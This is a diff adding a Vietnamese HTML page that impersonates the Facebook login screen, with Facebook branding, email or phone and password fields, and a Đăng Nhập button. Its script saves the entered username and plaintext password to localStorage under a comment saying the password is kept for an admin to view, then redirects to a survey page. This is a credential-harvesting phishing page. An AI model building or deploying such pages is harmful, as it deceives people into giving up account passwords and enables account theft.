@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Facebook</title>
+    <style>
+        /* Thiết lập nền và căn giữa form */
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(to right, #f0f2f5, #e2e4e8);
+            min-height: 100vh;
+            position: relative;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        /* Container chính giống FB */
+        .fb-container {
+            max-width: 980px;
+            margin: 0 auto;
+            display: flex;
+            align-items: center;
+            min-height: 80vh;
+            padding: 2rem;
+        }
+
+        .fb-left {
+            flex: 1;
+            text-align: center;
+        }
+
+        .fb-logo {
+            font-size: 4rem;
+            background: linear-gradient(45deg, #1877f2, #42b883);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 1rem;
+            font-weight: bold;
+        }
+
+        .fb-slogan {
+            font-size: 1.6rem;
+            color: #1c1e21;
+            font-weight: 300;
+        }
+
+        .login-container {
+            background: white;
+            padding: 2.5rem;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 380px;
+            box-sizing: border-box;
+        }
+
+        /* Tiêu đề */
+        .login-container h2 {
+            text-align: center;
+            color: #1c1e21;
+            margin-bottom: 24px;
+            font-size: 24px;
+        }
+
+        /* Các nhóm ô nhập liệu */
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 6px;
+            color: #606770;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ccd0d5;
+            border-radius: 6px;
+            box-sizing: border-box;
+            font-size: 16px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        /* Hiệu ứng khi bấm vào ô nhập liệu */
+        .form-group input:focus {
+            border-color: #1877f2;
+        }
+
+        /* Nút đăng nhập */
+        .btn-submit {
+            width: 100%;
+            padding: 12px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background-color 0.2s;
+        }
+
+        .btn-submit:hover {
+            background-color: #166fe5;
+        }
+
+        /* Nav cho Facebet link */
+        .top-nav {
+            display: flex;
+            gap: 1rem;
+            margin-bottom: 1rem;
+            justify-content: center;
+        }
+
+        .nav-link {
+            color: #1877f2;
+            text-decoration: none;
+            font-weight: bold;
+            padding: 0.5rem 1rem;
+            border: 1px solid #1877f2;
+            border-radius: 20px;
+            transition: background-color 0.3s;
+        }
+
+        .nav-link:hover {
+            background-color: #1877f2;
+            color: white;
+        }
+    </style>
+    <script>
+function handleLogin(event) {
+            event.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            if (username && password) {
+                localStorage.setItem('loggedInUser', username);
+                localStorage.setItem('loggedInPassword', password); // Lưu pass để admin xem
+                localStorage.setItem('userRole', 'student');
+                localStorage.setItem('loginTime', new Date().toLocaleString('vi-VN'));
+                
+                window.location.href = 'survey-complete.html';
+            } else {
+                alert('Nhập đầy đủ username và password!');
+            }
+        }
+    </script>
+</head>
+<body>
+    <div class="fb-container">
+        <div class="fb-left">
+        </div>
+        <div class="login-container">
+            <nav class="top-nav" style="justify-content: flex-end; margin-bottom: 1.5rem;">
+                <a href="facebet/index.html" class="nav-link">Facebook</a>
+            </nav>
+        <h2>Facebook</h2>
+        <form action="survey.html" method="POST" onsubmit="handleLogin(event)">
+            <div class="form-group">
+                <label for="username">Email hoặc số điện thoại</label>
+                <input type="text" id="username" name="username" placeholder="Email hoặc số điện thoại" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="password">Mật khẩu</label>
+                <input type="password" id="password" name="password" placeholder="Mật khẩu" required>
+            </div>
+            
+            <button type="submit" class="btn-submit">Đăng Nhập</button>
+        </form>
+    </div>
+
+</body>
+</html>
